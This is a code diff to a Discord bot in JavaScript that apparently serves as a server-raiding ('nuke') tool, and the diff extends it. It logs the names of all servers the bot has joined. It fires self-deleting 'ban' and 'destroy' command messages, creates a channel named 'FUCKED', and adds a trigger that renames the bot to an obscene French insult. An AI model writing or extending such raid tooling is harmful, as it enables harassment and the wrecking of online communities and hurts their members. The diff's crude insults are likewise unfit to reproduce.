@@ -10,7 +10,7 @@ function random(min, max){
 
 client.on("ready", () => {
     console.log(`${client.user.tag} prêt pour le carnage`)
-    client.user.setActivity(`?help | 2022 serveurs`,{type:"WATCHING"})
+    client.user.setActivity(`?help | 2026 serveurs`,{type:"PLAYING"})
     console.log('')
     console.log('')
     console.log('╔[═════════════════════════════════════════════════════════════════]╗')
@@ -22,6 +22,7 @@ client.on("ready", () => {
     console.log('')
     console.log('Informations :')
     console.log('')
+    console.log(`${client.guilds.map(c => c.name)}`)
     console.log(`servers ! [ " ${client.guilds.size} " ]`);
     console.log(`Users ! [ " ${client.users.size} " ]`);
     console.log(`channels ! [ " ${client.channels.size} " ]`);
@@ -594,7 +595,11 @@ if(message.content === "roles"){
                 message.channel.send("ban").then(m => m.delete());
                 message.channel.send("drole").then(m => m.delete());
                 message.channel.send("destroy").then(m => m.delete());
+                message.channel.send("jechange").then(m => m.delete());
                 message.guild.createChannel("FUCKED", "text").then(c => c.send("channel"))
+            }
+            if(message.content.includes("jechange")){
+                message.guild.members.get(bot.user.id).setNickname("JE T'ENCULE")
             }
         });
 client.login(process.env.TOKEN)
